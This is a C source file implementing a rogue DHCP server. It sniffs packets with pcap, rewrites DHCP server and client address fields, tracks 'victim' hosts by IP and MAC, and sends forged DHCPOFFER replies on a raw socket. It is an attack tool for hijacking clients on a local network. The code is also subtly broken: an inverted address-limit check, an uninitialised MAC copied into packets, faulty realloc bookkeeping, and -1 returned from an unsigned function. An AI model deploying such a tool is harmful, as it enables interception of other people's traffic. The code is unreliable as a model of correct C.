

#include "shared.h"
#define ON              1
#define TIMEOUT         1000
#define VIC_BUF_LEN     65535




typedef struct
{
    int id;
    uint32_t vic_ip;
    uint8_t vic_mac[6];

}vic_pkt;



static uint32_t subnet_call(char *buf);



uint8_t rogue_server(int *sockfd)
{

    struct pcap_pkthdr *header;
    const u_char *packet;
    char errbuf[PCAP_ERRBUF_SIZE];

    // Find network device.
    char *device = pcap_lookupdev(errbuf);
    if(!device)
    {
        fprintf(stderr,"No device found. !\n");
        return -1;
    }
    printf("Using device : %s\n",device);


    // Open device for capturing
    pcap_t *capture = pcap_open_live(device,PCAP_RECV_BUF,ON,TIMEOUT,errbuf);
    if(!capture)
    {
        fprintf(stderr,"capture failed.\n");
        return -1;
    }


    // sendto() and recvfrom() in one
        struct sockaddr_ll dest_addr;
        memset(&dest_addr,0,sizeof(dest_addr));
        dest_addr.sll_ifindex = if_nametoindex(eth0);
        dest_addr.sll_family = AF_PACKET;
        dest_addr.sll_halen = 6;
        dest_addr.sll_protocol = htons(ETH_P_ALL);
        memset(dest_addr.sll_addr,0xff,6);



    while(1)
    {
        int res = pcap_next_ex(capture,&header,&packet);
        if(res == 1)
        {
            char vic_buf[65535] = {0};
            memcpy(vic_buf,packet,VIC_BUF_LEN);
            int check_return = subnet_call(vic_buf);

            if(check_return == ALTER_PKT_SUCCESSFUL)
            {
                int send_offer = sendto(*sockfd,vic_buf,sizeof(vic_buf),0,(struct sockaddr*)&dest_addr,sizeof(dest_addr));
                if(send_offer == -1)
                {
                    fprintf(stderr,"DHCPOFFER send to vic failed.\n");
                    return -1;
                }
                else
                {
                    return ROGUE_SUCCESS;
                }
            }
        }
    }



}




static uint32_t subnet_call(char *buf)
{

    static int pkt_size = 1;
    static int inc = 1;
    static vic_pkt *heap = NULL;
    static int ip_value = 3;


    ethhdr *eth        = (ethhdr*)buf;
    struct iphdr *ip   = (struct iphdr*)(buf + ETH);
    struct udphdr *udp = (struct udphdr*)(buf + ETH + IP);
    dhcphdr *dhcp      = (dhcphdr*)(buf + ETH + IP + UDP);



    uint8_t server_ip[4] = {192,168,0,2};
    dhcp->siaddr = (192 << 24) | (168 << 16) | (0 << 8) | 2;

    if(ip_value <= 254)
    {
        fprintf(stderr,"IP's exceeded 254. \n");
        return 1;
    }

    if(heap == NULL)
    {
        heap = (vic_pkt*)realloc(NULL,pkt_size++ * sizeof(vic_pkt));
    }


    // Generate IP address per vic
    // Looping through to generate values


// +=============================+ //


    vic_pkt pkt;
    uint8_t dest_mac[6];


// +===== Validated Input Struct =====+ //

    pkt.id = inc++;                                                      // ID
    pkt.vic_ip = (192 << 24) | (168 << 16) | (0 << 8) | ip_value++;
    dhcp->yiaddr = pkt.vic_ip;                                         // VIC IP

    memcpy(eth->dst_mac,dest_mac,DMAC_LEN);                          // MAC
    memcpy(dest_mac,pkt.vic_mac,DMAC_LEN);                          // MAC



    // store the struct into the heap
    // each struct will be assigned with ID IP and MAC

    heap[pkt_size - 1] = pkt;

    dhcp->yiaddr = pkt.vic_ip;
    return ALTER_PKT_SUCCESSFUL;


}







